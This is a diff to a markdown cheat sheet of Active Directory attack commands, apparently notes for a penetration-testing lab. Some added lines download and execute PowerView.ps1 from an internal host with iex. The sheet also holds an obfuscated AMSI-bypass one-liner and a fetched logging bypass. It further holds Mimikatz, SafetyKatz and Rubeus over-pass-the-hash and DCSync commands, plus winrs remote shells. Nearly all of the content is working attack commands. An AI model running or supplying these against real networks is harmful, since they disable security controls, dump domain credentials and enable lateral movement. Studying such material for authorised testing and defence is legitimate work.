@@ -3,12 +3,14 @@
 ```powershell
 # Use Invishell
 C:/AD/Tools/InviShell/RunWithRegistryNonAdmin.bat
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1')) 
 
 # or use sbloggingbypass.txt + AMSI Bypass
 iex (iwr http://10.0.10.16/sbloggingbypass.txt-UseBasicParsing)
-
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
 ```
+
 # Lateral Movement 
 ```powershell
 One-To-One
@@ -74,7 +76,7 @@ Over-Pass-The-Hash  #for better offsec use AES keys than NTLM
 # Using Mimikatz
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'
 
-# Using SaafetyKatz
+# Using SafetyKatz
 SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
 
 #Using Rubeus (Recommended)
@@ -85,8 +87,9 @@ Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
 #1- Create a new process & inject the ticket init
 C:\Windows\system32> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 
-#2- Access the DC from the new process
-winrs -r:dcorp-dc cmd /c set username
+#2- Access the DC from the new process  #remember that this is logon type 9, means you will still have the same username in your CMD. However, if you use winrs to connect to the machine you will have the new creds
+winrs -r:dcorp-dc cmd /c set username  #show the username
+winrs -r:dcorp-dc cmd  #interactive CMD with new creds
 
 
 DCSync
@@ -98,3 +101,6 @@ SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ```
 
 # 
+```powershell
+
+```
